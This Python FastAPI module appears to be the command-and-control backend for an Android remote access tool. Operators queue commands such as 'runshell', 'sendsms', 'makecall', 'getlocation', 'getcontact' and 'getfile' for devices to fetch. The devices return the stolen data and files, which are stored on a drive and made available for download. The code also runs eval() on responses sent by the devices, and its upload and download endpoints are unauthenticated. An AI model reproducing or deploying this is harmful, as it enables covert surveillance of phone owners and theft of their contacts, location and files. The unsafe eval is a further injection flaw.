from datetime import datetime
from fastapi import APIRouter, File, UploadFile, Depends
from pydantic import BaseModel
from fastapi.responses import JSONResponse, StreamingResponse
from fastapi.encoders import jsonable_encoder
from db.database import command_db, tear_drive
from routers.client import client
from fastapi_jwt_auth import AuthJWT

router = APIRouter(
    prefix="/command",
    tags=["command"],
    responses={404: {"description": "Not found"}},
)

command_db = command_db()


class command_info(BaseModel):
    device_id: str
    command: str
    shell: str = None
    number: str = None
    data: str = None
    iscomplete: bool = False
    success: bool = False
    response: str = None
    date: datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    response_date: str = None


class complete(BaseModel):
    command_key: str
    response: str = None
    iscomplete: bool = True
    success: bool = True
    response_date: datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")


@router.post("/add")
async def add_command(command_info: command_info, Authorize: AuthJWT = Depends()):
    Authorize.jwt_required()
    command = command_db.put(jsonable_encoder(command_info))
    return JSONResponse(
        {
            "success": True,
            "command_key": command["key"],
            "device_id": command_info.device_id,
            "message": "command executed successfully",
        }
    )


@router.get("/device/{device_id}")
async def get_client(device_id: str):
    await client.update_lasttime(device_id)
    return JSONResponse(
        {
            "success": True,
            "command": command_db.fetch(
                {"device_id": device_id, "iscomplete": False}
            ).items,
        }
    )


@router.post("/complete")
async def get_all_clients(complete: complete):
    command_db.update(
        key=complete.command_key,
        updates={
            "iscomplete": complete.iscomplete,
            "response": complete.response,
            "success": complete.success,
            "response_date": complete.response_date,
        },
    )
    return JSONResponse({"success": True, "message": "Task completed"})


@router.get("/response/{command_key}")
async def get_response(command_key: str, Authorize: AuthJWT = Depends()):
    Authorize.jwt_required()
    singleResponse = ["runshell", "sendsms", "changewallpaper", "makecall"]
    response = command_db.get(key=command_key)
    if response["success"]:
        if response["command"] in singleResponse:
            return JSONResponse(
                {"success": True, "response": response["response"].split("\n")}
            )
        elif response["command"] == "listfile":
            files = eval(response["response"])["files"]
            return JSONResponse({"success": True, "response": files})
        elif response["command"] == "getlocation":
            return JSONResponse(
                {"success": True, "response": eval(response["response"])["location"]}
            )
        elif response["command"] == "getservices":
            return JSONResponse(
                {"success": True, "response": eval(response["response"])["services"]}
            )
        elif response["command"] == "getapps":
            return JSONResponse(
                {
                    "success": True,
                    "response": eval(response["response"])["installed_apps"],
                }
            )
        elif response["command"] == "getcontact":
            contact = eval(response["response"])["contact"]
            data = eval(str(contact)).items()
            return JSONResponse({"success": True, "response": list(data)})
        elif response["command"] == "getfile":
            return JSONResponse(
                {"success": True, "response": eval(response["response"])["filename"]}
            )
        else:
            new_response = []
            data = eval(response["response"])
            header = list(data[list(data.keys())[0]][0].keys())
            response = data[list(data.keys())[0]]
            for i in response:
                new_response.append(list(i.values()))
            return JSONResponse(
                {"success": True, "header": header, "response": new_response}
            )
    else:
        return JSONResponse(
            {"success": False, "message": "this command did not send any response"}
        )


@router.post("/upload")
async def upload_file(file: UploadFile = File(...)):
    drive = await tear_drive()
    name = file.filename
    f = file.file
    return JSONResponse(
        {
            "success": True,
            "filename": drive.put(name, f),
            "message": "file uploaded successfully",
        }
    )


@router.get("/download/{filename}")
async def download_file(filename: str):
    drive = await tear_drive()
    res = drive.get(filename)
    return StreamingResponse(
        res.iter_chunks(1024),
        media_type="application/octet-stream",
        headers={"Content-Disposition": 'attachment; filename="{}"'.format(filename)},
    )


@router.get("/")
async def get_all_commands(Authorize: AuthJWT = Depends()):
    Authorize.jwt_required()
    data = command_db.fetch().items
    for command in data:
        del command["response"]
    return JSONResponse({"success": True, "command": sorted(data, key=lambda i: datetime.fromisoformat(i["date"]),reverse=True)})


@router.get("/delete/id/{command_key}")
async def delete_command(command_key: str, Authorize: AuthJWT = Depends()):
    Authorize.jwt_required()
    command_db.delete(key=command_key)
    return JSONResponse({"success": True, "message": "command deleted successfully"})


@router.get("/delete/all")
async def delete_all_commands(Authorize: AuthJWT = Depends()):
    Authorize.jwt_required()
    data = command_db.fetch().items
    for i in data:
        command_db.delete(key=i["key"])
    return JSONResponse(
        {"success": True, "message": "all commands deleted successfully"}
    )
